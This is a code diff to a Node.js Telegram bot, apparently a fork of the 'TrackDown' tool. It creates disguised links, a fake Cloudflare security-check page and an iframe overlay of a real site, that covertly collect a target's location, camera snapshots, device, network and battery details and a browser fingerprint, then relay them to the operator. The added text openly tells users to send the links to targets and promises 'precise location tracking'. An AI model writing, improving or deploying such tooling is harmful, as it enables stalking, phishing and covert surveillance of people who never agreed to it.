@@ -19,7 +19,7 @@ app.use(cors());
 
 // Global variables
 const bot = new TelegramBot(process.env.bot);
-const hostURL = "https://sg-modder-offcial.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
+const hostURL = "https://YOUR-VERCEL-URL-HERE.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
 const use1pt = false;
 
 // Get the template paths
@@ -54,43 +54,118 @@ async function createLink(cid, msg) {
   var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
   if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
+    // Show typing indicator
+    await bot.sendChatAction(cid, "typing");
+    
+    // Generate a loading message
+    const loadingMsg = await bot.sendMessage(
+      cid, 
+      "<i>🔄 Generating secure tracking links...</i>", 
+      { parse_mode: "HTML" }
+    );
+    
+    // Create the encoded URL
     var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
+    var cUrl = `${hostURL}/c/${url}`;
+    var wUrl = `${hostURL}/w/${url}`;
+    
+    // Button settings
     var m = {
+      parse_mode: "HTML",
       reply_markup: JSON.stringify({
-        "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
+        "inline_keyboard": [
+          [
+            { text: "🔄 Create New Link", callback_data: "crenew" },
+            { text: "📖 Help", callback_data: "help" }
+          ]
+        ]
       })
     };
 
-    var cUrl = `${hostURL}/c/${url}`;
-    var wUrl = `${hostURL}/w/${url}`;
+    // Simulate processing time
+    setTimeout(async () => {
+      // Delete the loading message
+      await bot.deleteMessage(cid, loadingMsg.message_id);
+      
+      // Success message with date/time
+      const date = new Date();
+      const formattedDate = date.toLocaleString('en-US', {
+        weekday: 'short',
+        month: 'short', 
+        day: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit'
+      });
+      
+      if (use1pt) {
+        try {
+          var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
+          var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
 
-    await bot.sendChatAction(cid, "typing");
-    if (use1pt) {
-      try {
-        var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-        var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
+          var f = "", g = "";
 
-        var f = "", g = "";
+          for (var c in x) {
+            f += x[c] + "\n";
+          }
 
-        for (var c in x) {
-          f += x[c] + "\n";
+          for (var c in y) {
+            g += y[c] + "\n";
+          }
+
+          await bot.sendMessage(
+            cid, 
+            `<b>✅ Tracking Links Generated</b>\n` +
+            `<i>${formattedDate}</i>\n\n` +
+            `<b>🎯 Target URL:</b> ${msg}\n\n` +
+            `<b>📊 TRACKING LINKS:</b>\n\n` +
+            `<b>🔒 CloudFlare Security Check</b> (Recommended)\n` +
+            `<code>${f}</code>\n\n` +
+            `<b>🔎 WebView Page</b>\n` +
+            `<code>${g}</code>\n\n` +
+            `<i>💡 Send either link to your target. Once they open it, you'll receive their information automatically.</i>`, 
+            m
+          );
+        } catch (error) {
+          // If URL shortener fails, send direct links
+          await bot.sendMessage(
+            cid, 
+            `<b>✅ Tracking Links Generated</b>\n` +
+            `<i>${formattedDate}</i>\n\n` +
+            `<b>🎯 Target URL:</b> ${msg}\n\n` +
+            `<b>📊 TRACKING LINKS:</b>\n\n` +
+            `<b>🔒 CloudFlare Security Check</b> (Recommended)\n` +
+            `<code>${cUrl}</code>\n\n` +
+            `<b>🔎 WebView Page</b>\n` +
+            `<code>${wUrl}</code>\n\n` +
+            `<i>💡 Send either link to your target. Once they open it, you'll receive their information automatically.</i>`, 
+            m
+          );
         }
-
-        for (var c in y) {
-          g += y[c] + "\n";
-        }
-
-        await bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
-      } catch (error) {
-        // If URL shortener fails, send direct links
-        await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+      } else {
+        // Send direct links
+        await bot.sendMessage(
+          cid, 
+          `<b>✅ Tracking Links Generated</b>\n` +
+          `<i>${formattedDate}</i>\n\n` +
+          `<b>🎯 Target URL:</b> ${msg}\n\n` +
+          `<b>📊 TRACKING LINKS:</b>\n\n` +
+          `<b>🔒 CloudFlare Security Check</b> (Recommended)\n` +
+          `<code>${cUrl}</code>\n\n` +
+          `<b>🔎 WebView Page</b>\n` +
+          `<code>${wUrl}</code>\n\n` +
+          `<i>💡 Send either link to your target. Once they open it, you'll receive their information automatically.</i>`, 
+          m
+        );
       }
-    } else {
-      await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
-    }
+    }, 1500);
+    
     return true;
   } else {
-    await bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
+    await bot.sendMessage(
+      cid, 
+      `<b>⚠️ Invalid URL</b>\n\nPlease enter a valid URL that includes http:// or https://\n\nExample: https://instagram.com`,
+      { parse_mode: "HTML" }
+    );
     await createNew(cid);
     return false;
   }
@@ -99,9 +174,18 @@ async function createLink(cid, msg) {
 // Create new request function (webhook version)
 async function createNew(cid) {
   var mk = {
+    parse_mode: "HTML",
     reply_markup: JSON.stringify({ "force_reply": true })
   };
-  await bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
+  await bot.sendAnimation(
+    cid, 
+    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcDd6ZWl2ZXJ0NnEyOHQzaXhxaTdyOXgxdWxrdWE4aWdkcmV3dXd6aiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/077i6AULCXc0FKTj9s/giphy.gif",
+    { caption: "<b>🔗 Enter the destination URL</b>\n\nThis is the website your target will see after their information is collected.\n\n<i>Example: https://instagram.com</i>", parse_mode: "HTML" }
+  );
+  
+  setTimeout(async () => {
+    await bot.sendMessage(cid, `<b>🌐 Enter Your URL:</b>\n<i>Include http:// or https://</i>`, mk);
+  }, 500);
 }
 
 // ROUTES
@@ -126,7 +210,18 @@ app.post("/", (req, res) => {
     
     data = data.replaceAll("<br>", "\n");
     
-    bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
+    // Send a fancy alert with target information
+    bot.sendMessage(
+      parseInt(uid, 36), 
+      `<b>🔔 TARGET DETECTED</b>\n\n` +
+      `<i>Information collection has begun. Data will arrive shortly.</i>`,
+      {parse_mode: "HTML"}
+    );
+    
+    // Add a small delay to make it look like processing is happening
+    setTimeout(() => {
+      bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
+    }, 800);
     
     res.send("Done");
   } else {
@@ -271,7 +366,8 @@ app.post("/webhook", async (req, res) => {
       const chatId = msg.chat.id;
       
       // Handle reply to "Enter Your URL" message
-      if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
+      if (msg.reply_to_message && (msg.reply_to_message.text === "🌐 Enter Your URL" || 
+          msg.reply_to_message.text.includes("<b>🌐 Enter Your URL:</b>"))) {
         await createLink(chatId, msg.text);
         return res.status(200).send("OK");
       }
@@ -279,14 +375,28 @@ app.post("/webhook", async (req, res) => {
       // Handle /start command
       if (msg.text === "/start") {
         var m = {
+          parse_mode: "HTML",
           reply_markup: JSON.stringify({
-            "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
+            "inline_keyboard": [
+              [{ text: "🔗 Create Tracking Link", callback_data: "crenew" }],
+              [{ text: "ℹ️ Help", callback_data: "help" }],
+              [{ text: "👨‍💻 Developer", url: "https://t.me/th30neand0nly0ne" }]
+            ]
           })
         };
         
         await bot.sendMessage(
           chatId, 
-          `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
+          `<b>🎯 Welcome, ${msg.chat.first_name}!</b>\n\n` +
+          `<i>TrackDown</i> is an advanced tracking system that allows you to monitor targets with precision.\n\n` +
+          `<b>🔍 Capabilities:</b>\n` +
+          `• 📱 Complete device information\n` +
+          `• 📷 Camera access & snapshots\n` +
+          `• 📍 Precise location tracking\n` +
+          `• 🌐 Network details & configuration\n` +
+          `• 🔋 Battery status monitoring\n` + 
+          `• 🧩 Advanced browser fingerprinting\n\n` +
+          `<b>Click the button below to create your first tracking link:</b>`, 
           m
         );
       }
@@ -298,15 +408,27 @@ app.post("/webhook", async (req, res) => {
       else if (msg.text === "/help") {
         await bot.sendMessage(
           chatId,
-          ` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`
+          `<b>📚 TrackDown Help Guide</b>\n\n` +
+          `<b>🔹 Basic Usage:</b>\n` +
+          `This powerful tool creates specialized links that extract information from your target when they click. Each link appears legitimate while collecting data in the background.\n\n` +
+          `<b>🔹 Link Types:</b>\n\n` +
+          `<b>1️⃣ CloudFlare Security Check</b> (Recommended)\n` +
+          `• Displays a realistic CloudFlare security verification page\n` +
+          `• Collects data while appearing to verify the browser\n` +
+          `• Automatically redirects to your specified destination URL\n` +
+          `• Works with most target websites\n\n` +
+          `<b>2️⃣ WebView Overlay</b>\n` +
+          `• Loads your destination site in an iframe\n` +
+          `• Collects data while displaying the actual website\n` +
+          `• ⚠️ Some sites block iframe loading (e.g., Google, Facebook)\n` +
+          `• Best for less restrictive websites\n\n` +
+          `<b>🔹 How to Create Links:</b>\n` +
+          `1. Click "Create Tracking Link" or type /create\n` +
+          `2. Enter a destination URL (must include http:// or https://)\n` +
+          `3. Send the generated links to your target\n` +
+          `4. Wait for information to be collected\n\n` +
+          `<b>💻 Project Repository:</b> <a href="https://github.com/Th30neAnd0nly/TrackDown">GitHub</a>`,
+          { parse_mode: "HTML" }
         );
       }
     }
